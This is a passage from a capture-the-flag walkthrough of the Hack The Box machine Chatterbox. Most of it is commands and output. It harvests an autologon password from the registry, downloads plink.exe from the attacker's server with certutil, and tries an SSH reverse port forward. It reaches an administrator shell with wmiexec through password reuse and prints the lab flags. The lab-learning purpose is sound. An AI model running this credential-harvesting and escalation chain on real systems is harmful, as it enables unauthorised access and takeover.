    (Default)    REG_SZ    IHomeGroupPassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}
    (Default)    REG_SZ    _PasswordDeriveBytes

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{68FFF241-CA49-4754-A3D8-4B4127518549}
    (Default)    REG_SZ    ISupportPasswordMode

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Capabilities\Roaming\FormSuggest
    FilterIn    REG_SZ    FormSuggest Passwords,Use FormSuggest,FormSuggest PW Ask

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\ASK
    Text    REG_SZ    Prompt for user name and password

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\SILENT
    Text    REG_SZ    Automatic logon with current user name and password

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{63d2bb1d-e39a-41b8-9a3d-52dd06677588}\ChannelReferences\5
    (Default)    REG_SZ    Microsoft-Windows-Shell-AuthUI-PasswordProvider/Diagnostic

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}
    (Default)    REG_SZ    WCN Password - PIN

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BEEB-D33A-4A4B-BF23-BBEF4663D017}\Children\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}
    (Default)    REG_SZ    WCN Password PIN

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\EH-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\WinStations\EH-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\EH-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

End of search: 49 match(es) found.
```

- Dump Winlogon
```
C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x11
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
```

- `rpcclient` with creds found (`Alfred:Welcome1!`)
```
┌──(root㉿kali)-[~/Downloads]
└─# rpcclient -U Alfred 10.10.10.74             
Password for [WORKGROUP\Alfred]:
rpcclient $> ls
command not found: ls
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Alfred] rid:[0x3e8]
user:[Guest] rid:[0x1f5]
rpcclient $> enumdomusers
quser:[Administrator] rid:[0x1f4]
user:[Alfred] rid:[0x3e8]
user:[Guest] rid:[0x1f5]
uerrpcclient $> querydominfo
Domain:         CHATTERBOX
Server:
Comment:
Total Users:    3
Total Groups:   1
Total Aliases:  0
Sequence No:    39
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
```

- `netstat` shows listening ports - shows internal ports not in external scan with `nmap`
```
C:\Windows\system32>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       356
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       716
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       904
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       456
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       2040
  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       464
  TCP    10.10.10.74:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.10.74:9255       0.0.0.0:0              LISTENING       3572
  TCP    10.10.10.74:9256       0.0.0.0:0              LISTENING       3572
  TCP    10.10.10.74:49158      10.10.14.4:4444        ESTABLISHED     3572
  TCP    [::]:135               [::]:0                 LISTENING       664
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       356
  TCP    [::]:49153             [::]:0                 LISTENING       716
  TCP    [::]:49154             [::]:0                 LISTENING       904
  TCP    [::]:49155             [::]:0                 LISTENING       456
  TCP    [::]:49156             [::]:0                 LISTENING       2040
  TCP    [::]:49157             [::]:0                 LISTENING       464
  UDP    0.0.0.0:123            *:*                                    860
  UDP    0.0.0.0:500            *:*                                    904
  UDP    0.0.0.0:4500           *:*                                    904
  UDP    0.0.0.0:5355           *:*                                    1156
  UDP    0.0.0.0:63220          *:*                                    1156
  UDP    10.10.10.74:137        *:*                                    4
  UDP    10.10.10.74:138        *:*                                    4
  UDP    10.10.10.74:1900       *:*                                    3040
  UDP    10.10.10.74:9256       *:*                                    3572
  UDP    10.10.10.74:63458      *:*                                    3040
  UDP    127.0.0.1:1900         *:*                                    3040
  UDP    127.0.0.1:63459        *:*                                    3040
  UDP    [::]:123               *:*                                    860
  UDP    [::]:500               *:*                                    904
  UDP    [::]:4500              *:*                                    904
  UDP    [::1]:1900             *:*                                    3040
  UDP    [::1]:63457            *:*                                    3040
```

- With creds found (`Alfred:Welcome1!`) we can use port forwarding to the listening port `445`
	- `plink.exe` - likely the next step for #PrivEsc (tool for port forwarding ssh/putty)
	-  [Download here](https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe)
- Transfer plink to RHOST
```
┌──(root㉿kali)-[~/Downloads]
└─# ll
total 11224
-rwxr-xr-x 1 root root    5473 Oct  2 08:11 achat.py
-rw-r--r-- 1 root root  784384 Oct  1 15:05 Chimichurri.exe
-rw-r--r-- 1 root root  845104 Oct  2 09:16 plink.exe
-rw-r--r-- 1 root root 9849344 Oct  1 13:09 winPEASx64.exe
                                                                                                                                                            
┌──(root㉿kali)-[~/Downloads]
└─# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

- Grab file from LHOST
```
C:\Users\Alfred>certutil -urlcache -f http://10.10.14.4:8000/plink.exe plink.exe                                 
certutil -urlcache -f http://10.10.14.4:8000/plink.exe plink.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\Alfred>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users\Alfred

10/02/2024  05:19 PM    <DIR>          .
10/02/2024  05:19 PM    <DIR>          ..
12/10/2017  01:05 PM    <DIR>          Contacts
12/10/2017  07:50 PM    <DIR>          Desktop
12/10/2017  01:05 PM    <DIR>          Documents
12/10/2017  01:25 PM    <DIR>          Downloads
12/10/2017  01:05 PM    <DIR>          Favorites
12/10/2017  01:05 PM    <DIR>          Links
12/10/2017  01:05 PM    <DIR>          Music
12/10/2017  01:05 PM    <DIR>          Pictures
10/02/2024  05:19 PM           845,104 plink.exe
12/10/2017  01:05 PM    <DIR>          Saved Games
12/10/2017  01:05 PM    <DIR>          Searches
12/10/2017  01:05 PM    <DIR>          Videos
               1 File(s)        845,104 bytes
              13 Dir(s)   3,345,833,984 bytes free
```

- Install `ssh` and edit config to permit root login
```
┌──(root㉿kali)-[~/Downloads]
└─# apt install ssh

┌──(root㉿kali)-[~/Downloads]
└─# gedit /etc/ssh/sshd_config  
```

- Modify this line:
```
#PermitRootLogin prohibit-password
```
- To this:
```
PermitRootLogin yes
```
- Also, must change `ssh` port from 22 to something else, HTB blocks outbound `ssh` connections... Changed this line
```
#Port 22
```
- To this:
```
Port <PORT NUMBER>
```

- Save file and do `service ssh restart`
- Check it is enabled with `service ssh start` and `service ssh status`
- Run `plink.exe` from RHOST, specifying new `ssh` port to use
```
C:\Users\Alfred>plink.exe -v root@10.10.14.4 -R 445:127.0.0.1:445 -P 2222
plink.exe -v root@10.10.14.4 -R 445:127.0.0.1:445 -P 2222
Looking up host "10.10.14.4" for SSH connection
Connecting to 10.10.14.4 port 2222
Connected to 10.10.14.4
Remote version: SSH-2.0-OpenSSH_9.9p1 Debian-1
Using SSH protocol version 2
If you trust this host, enter "y" to add the key to Plink's
cache and carry on connecting.
If you want to carry on connecting just once, without adding
the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n, Return cancels connection, i for more info) y
Using username "root".
root@10.10.14.4's password: *****************

Sent password
Access granted

Started a shell/command
Linux kali 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64





root@kali:-#
```
- Was told I may need to hit `ENTER` a few times for `root@kali:-#` to show
- I was unsuccessful getting the`root@kali:-#` to show, also tried this with same failed result:
```
plink.exe -l root -pw ************ -R 445:127.0.0.1:445 10.10.14.4 -P 2222
```

- However, if you were successful here are the next steps:
```
winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
``` 

- Hit enter/rerun command until you get a shell
- Should be logged in as `chatterbox\administrator` and check `whoami /priv`

---

- After being unable to get `plink.exe` to show the `root@kali:-#`, I was successful in escalating privileges by using `wmiexec` with the creds `Administrator:Welcome1!`
	- _Note: I know I should figure out why plink is not working, but with the community sharing their thoughts on this box, it seemed a better use of time to move onto another attack path. Besides I got `plink` to show `Started a shell/command`, the shell just never started_

```
┌──(root㉿kali)-[~/Downloads]
└─# wmiexec.py Administrator:'Welcome1!'@10.10.10.74                      
/usr/local/bin/wmiexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20240916.171021.65b774de', 'wmiexec.py')
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\

06/10/2009  05:42 PM                24 autoexec.bat
06/10/2009  05:42 PM                10 config.sys
07/13/2009  10:37 PM    <DIR>          PerfLogs
03/07/2022  12:31 AM    <DIR>          Program Files
12/10/2017  10:21 AM    <DIR>          Users
10/02/2024  05:54 PM    <DIR>          Windows
               2 File(s)             34 bytes
               4 Dir(s)   3,666,173,952 bytes free

C:\>whoami
chatterbox\administrator

C:\Users\Administrator\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State  
=============================== ========================================= =======
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled
SeSecurityPrivilege             Manage auditing and security log          Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
SeLoadDriverPrivilege           Load and unload device drivers            Enabled
SeSystemProfilePrivilege        Profile system performance                Enabled
SeSystemtimePrivilege           Change the system time                    Enabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
SeCreatePagefilePrivilege       Create a pagefile                         Enabled
SeBackupPrivilege               Back up files and directories             Enabled
SeRestorePrivilege              Restore files and directories             Enabled
SeShutdownPrivilege             Shut down the system                      Enabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Enabled
SeUndockPrivilege               Remove computer from docking station      Enabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
SeTimeZonePrivilege             Change the time zone                      Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled
```

- User flag - Alfred
```
C:\Users\Alfred\Desktop>type user.txt
type user.txt
be6b9ea2f3d89bb04f3c562fd3d29458
```

- Root flag
```
C:\Users\Administrator\Desktop>type root.txt
af99967bf40e56d566799bba2611fc29
```